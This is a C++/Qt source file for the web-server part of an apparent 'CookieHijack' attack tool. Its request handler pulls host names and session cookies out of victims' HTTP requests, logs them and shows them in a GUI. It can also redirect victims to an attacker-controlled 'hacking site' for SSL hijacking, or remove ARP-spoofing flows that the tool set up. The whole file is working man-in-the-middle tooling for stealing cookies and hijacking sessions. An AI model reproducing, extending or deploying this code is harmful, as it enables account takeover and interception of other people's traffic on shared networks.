#include "webserver.h"
#include "cookiehijack.h"

WebServer::WebServer(QObject *parent) : GStateObj(parent) {
	ch_ = dynamic_cast<CookieHijack*>(parent);
	Q_ASSERT(ch_ != nullptr);
}

WebServer::~WebServer() {
	close();
}

bool WebServer::doOpen() {
	if (tcpServer_ != nullptr)
		delete tcpServer_;
	tcpServer_ = new QTcpServer(this);
	prepareTcpServer(tcpServer_);
	if (!tcpServer_->listen(QHostAddress::AnyIPv4, httpPort_)) {
		SET_ERR(GErr::Fail, tcpServer_->errorString());
		return false;
	}

	if (sslServer_ != nullptr)
		delete sslServer_;
	sslServer_ = new QSslServer(this);
	prepareTcpServer(sslServer_);
	prepareSslServer(sslServer_);
	if (!sslServer_->listen(QHostAddress::AnyIPv4, httpsPort_)) {
		SET_ERR(GErr::Fail, sslServer_->errorString());
		return false;
	}

	return true;
}

bool WebServer::doClose() {
	if (tcpServer_ != nullptr) {
		tcpServer_->close();
		delete tcpServer_;
		tcpServer_ = nullptr;
	}

	if (sslServer_ != nullptr) {
		sslServer_->close();
		delete sslServer_;
		sslServer_ = nullptr;
	}

	return true;
}


void WebServer::prepareAbstractSocket(QAbstractSocket* socket) {
	// QIODevice
	QObject::connect(socket, &QIODevice::readyRead, this, &WebServer::doReadyRead);

	// QAbstractSocket
	QObject::connect(socket, &QAbstractSocket::connected, this, &WebServer::doConnected);
	QObject::connect(socket, &QAbstractSocket::disconnected, this, &WebServer::doDisconnected);
	QObject::connect(socket, &QAbstractSocket::errorOccurred, this, &WebServer::doErrorOccurred);
	QObject::connect(socket, &QAbstractSocket::stateChanged, this, &WebServer::doStateChanged);
}

void WebServer::prepareSslSocket(QSslSocket* socket) {
	// QSslSocket
	QObject::connect(socket, &QSslSocket::handshakeInterruptedOnError, this, &WebServer::doHandshakeInterruptedOnError);
	QObject::connect(socket, &QSslSocket::modeChanged, this, &WebServer::doModeChanged);
	QObject::connect(socket, &QSslSocket::peerVerifyError, this, &WebServer::doPeerVerifyError);
	QObject::connect(socket, &QSslSocket::sslErrors, this, &WebServer::doSslErrors);
}

void WebServer::prepareTcpServer(QTcpServer* server) {
	QObject::connect(server, &QTcpServer::acceptError, this, &WebServer::serverAcceptError);
	QObject::connect(server, &QTcpServer::newConnection, this, &WebServer::serverNewConnection);
	QObject::connect(server, &QTcpServer::pendingConnectionAvailable, this, &WebServer::serverPendingConnectionAvailable);
}

void WebServer::prepareSslServer(QSslServer* server) {
	QObject::connect(server, &QSslServer::errorOccurred, this, &WebServer::serverErrorOccurred);
	QObject::connect(server, &QSslServer::sslErrors, this, &WebServer::serverSslErrors);
	QObject::connect(server, &QSslServer::startedEncryptionHandshake, this, &WebServer::serverStartedEncryptionHandshake);
}

#include "chwidget.h"
void WebServer::doReadyRead() {
	qDebug() << "";
	QAbstractSocket* socket = dynamic_cast<QAbstractSocket*>(sender());
	Q_ASSERT(socket != nullptr);

	segments_[socket] += socket->readAll();
	QString httpRequest = segments_[socket];
	qDebug() << httpRequest;
	GIp ip = socket->peerAddress().toString();

	QString host, cookie;
	if (ch_->cookieHijack_.extract(httpRequest, host, cookie)) {
		segments_[socket] = "";
		qDebug() << "\n" << host << "\n" << cookie;

		time_t created = QDateTime::currentDateTime().toSecsSinceEpoch();
		ch_->cookieHijack_.insert(created, GMac::nullMac(), ip, host, cookie);

		ChWidget* chWidget = dynamic_cast<ChWidget*>(ch_->parent());
		Q_ASSERT(chWidget != nullptr);
		chWidget->addItem(host, cookie);
	}

	if (httpRequest.startsWith("\u0016")) {
		qDebug() << "TLS Handshake!!!(0x16)!!!";
		socket->close();
		return;
	}

	qsizetype i = httpRequest.indexOf("\r\n\r\n");
	if (i == -1) return;
	qDebug() << "found \\r\\n\\r\\n";
	if (hijackSsl_) {
		QStringList httpResponse;
		httpResponse += "HTTP/1.1 302 Redirect";
		QString locationStr =  QString("Location: https://%1.%2").arg(ch_->prefix_).arg(ch_->hackingSite_);
		if (httpsPort_ != 443) locationStr += ":" + QString::number(httpsPort_);
		httpResponse += locationStr;
		httpResponse += "";
		httpResponse += "";
		socket->write(httpResponse.join("\r\n").toUtf8());
		qDebug() << "Try " + locationStr;
	} else {
		socket->write(goodbyeMessage_.join("\r\n").toUtf8());
		GIntf* intf = ch_->autoArpSpoof_.intf();
		Q_ASSERT(intf != nullptr);
		GIp gateway = intf->gateway();
		ch_->autoArpSpoof_.removeFlows(ip, gateway, gateway, ip);
	}
	socket->close();
}

void WebServer::doConnected() {
	QAbstractSocket* socket = dynamic_cast<QAbstractSocket*>(sender());
	Q_ASSERT(socket != nullptr);

	qDebug() << QString("[connected] %1:%2\r\n").arg(socket->peerAddress().toString()).arg(QString::number(socket->peerPort()));
	segments_.insert(socket, QString());
}

void WebServer::doDisconnected() {
	QAbstractSocket* socket = dynamic_cast<QAbstractSocket*>(sender());
	Q_ASSERT(socket != nullptr);

	qDebug() << QString("[disconnected] %1:%2\r\n").arg(socket->peerAddress().toString()).arg(QString::number(socket->peerPort()));
	segments_.remove(socket);
}

void WebServer::doErrorOccurred(QAbstractSocket::SocketError socketError) {
	const QMetaObject& mobj = QAbstractSocket::staticMetaObject;
	QString value = mobj.enumerator(mobj.indexOfEnumerator("SocketError")).valueToKey(socketError);
	qDebug() << value;
}

void WebServer::doStateChanged(QAbstractSocket::SocketState socketState) {
	const QMetaObject& mobj = QAbstractSocket::staticMetaObject;
	QString value = mobj.enumerator(mobj.indexOfEnumerator("SocketState")).valueToKey(socketState);
	qDebug() << QString::number(socketState) << value;
}

void WebServer::doHandshakeInterruptedOnError(const QSslError& error) {
	qDebug() << error.errorString();
}

void WebServer::doModeChanged(QSslSocket::SslMode mode) {
	switch (mode) {
		case QSslSocket::UnencryptedMode: qDebug() << "UnencryptedMode"; break;
		case QSslSocket::SslClientMode: qDebug() << "SslClientMode"; break;
		case QSslSocket::SslServerMode: qDebug() << "SslServerMode"; break;
	}
}

void WebServer::doPeerVerifyError(const QSslError& error) {
	qDebug() << error.errorString();
}

void WebServer::doSslErrors(const QList<QSslError>& errors) {
	for (const QSslError& error: errors)
		qDebug() << error.errorString();
}

void WebServer::serverAcceptError(QAbstractSocket::SocketError socketError) {
	if (socketError == QAbstractSocket::UnknownSocketError) return;
	const QMetaObject& mobj = QAbstractSocket::staticMetaObject;
	QMetaEnum menum = mobj.enumerator(mobj.indexOfEnumerator("SocketError"));
	QString key = menum.valueToKey(socketError);
	qDebug() << "[accept error] " + key + "\r\n";
}

void WebServer::serverNewConnection() {
	qDebug() << "";
}

void WebServer::serverPendingConnectionAvailable() {
	QTcpServer* server = dynamic_cast<QTcpServer*>(sender());
	Q_ASSERT(server != nullptr);

	while (server->hasPendingConnections()) {
		QAbstractSocket* socket = server->nextPendingConnection();
		qDebug() << QString("[connected] %1:%2\r\n").arg(socket->peerAddress().toString()).arg(QString::number(socket->peerPort()));
		prepareAbstractSocket(socket);
		QSslSocket* sslSocket = dynamic_cast<QSslSocket*>(socket);
		if (sslSocket != nullptr)
			prepareSslSocket(sslSocket);

		segments_.insert(socket, QString());
	}
}

void WebServer::serverErrorOccurred(QSslSocket* socket, QAbstractSocket::SocketError socketError) {
	(void)socket;
	const QMetaObject& mobj = QAbstractSocket::staticMetaObject;
	QString value = mobj.enumerator(mobj.indexOfEnumerator("SocketError")).valueToKey(socketError);
	qDebug() << value;
}

void WebServer::serverSslErrors(QSslSocket* socket, const QList<QSslError>& errors) {
	(void)socket;
	for (const QSslError& error: errors)
		qDebug() << error.errorString();
}

void WebServer::serverStartedEncryptionHandshake(QSslSocket* socket) {
	(void)socket;
	qDebug() << "";
}
